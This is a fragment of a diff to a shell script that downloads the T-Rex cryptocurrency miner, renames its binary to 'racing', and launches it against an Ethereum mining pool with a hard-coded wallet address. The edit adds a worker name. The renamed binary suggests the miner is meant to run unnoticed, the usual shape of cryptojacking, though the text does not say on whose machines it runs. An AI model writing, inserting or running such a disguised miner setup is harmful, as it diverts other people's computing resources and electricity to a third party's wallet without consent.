@@ -11,4 +11,4 @@ apt-get install libcurl3 -y
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x
+/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x -w aa2
